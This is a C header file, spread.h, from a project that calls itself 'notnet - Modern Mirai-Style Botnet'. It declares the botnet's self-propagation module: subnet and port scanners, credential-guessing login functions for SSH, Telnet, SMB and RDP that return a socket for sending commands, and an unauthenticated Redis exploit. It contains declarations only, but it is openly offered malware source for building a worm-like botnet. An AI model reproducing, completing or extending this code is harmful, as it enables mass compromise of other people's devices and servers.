/*
 * notnet - Modern Mirai-Style Botnet
 * spread.h - Multi-vector spreading module
 *
 * Targets: SSH, Telnet, SMB, Redis, RDP
 */
#ifndef NOTNET_SPREAD_H
#define NOTNET_SPREAD_H

#include "protocol.h"

/* ── Spread Vectors ─────────────────────────────────────────── */
#define SPREAD_SSH     0x01
#define SPREAD_TELNET  0x02
#define SPREAD_SMB     0x04
#define SPREAD_REDIS   0x08
#define SPREAD_RDP     0x10

/* ── Target Structure ───────────────────────────────────────── */
typedef struct {
    char ip[16];
    uint16_t port;
    uint8_t service;
    uint8_t active;
} notnet_target_t;

/* ── Scan Result ────────────────────────────────────────────── */
typedef struct {
    char ip[16];
    uint16_t port;
    char banner[256];
    uint32_t open:1;
    uint32_t service:4; /* SPREAD_* */
} notnet_scan_result_t;

/* ── Core Functions ─────────────────────────────────────────── */
int spread_local(notnet_bot_t *bot);
int spread_target(notnet_bot_t *bot, notnet_target_t *target);
int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask);
int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port);
char *scan_ports(const char *target, uint16_t *ports, int port_count);
int spawn_scan_threads(notnet_bot_t *bot, const char *subnet, uint8_t service_mask);

/* ── Service Spreaders ──────────────────────────────────────── */
int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port);
int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port);
int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port);
int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port);
int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port);

/* ── Service Helpers ────────────────────────────────────────── */
/* Returns socket fd on success (caller must close), -1 on failure.
 * SECURITY FIX (#15): Changed from int success to int fd so the caller
 * can send commands over the established connection. */
int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *pass);
int try_login_telnet(const char *ip, uint16_t port, const char *user, const char *pass);
int try_login_smb(const char *ip, uint16_t port, const char *user, const char *pass);
int try_login_rdp(const char *ip, uint16_t port, const char *user, const char *pass);
int exploit_redis_unauth(const char *ip, uint16_t port);

#endif /* NOTNET_SPREAD_H */
